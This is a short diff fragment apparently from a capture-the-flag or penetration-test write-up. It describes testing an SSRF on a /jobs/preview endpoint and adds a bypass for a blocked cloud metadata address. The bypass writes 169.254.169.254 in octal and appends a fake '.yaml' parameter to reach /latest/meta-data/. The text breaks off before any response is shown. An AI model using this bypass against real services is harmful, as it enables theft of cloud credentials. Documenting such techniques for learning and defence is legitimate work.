@@ -27,6 +27,13 @@ Hint: Your SSH key needs to be approved by a DevOps lead. Ping marcus on Slack.
 first test the endpoint /jobs/preview where the url is passed i test the ssrf
 
 i test 169.254.169.254 which is blacklist so i 
+Encode the IMDS IP in octal: 169.254.169.254 into 0251.0376.0251.0376
+
+then test first:
+
+url=http://0251.0376.0251.0376/latest/meta-data/?a=test.yaml
+
+Response is
 ```
 
 
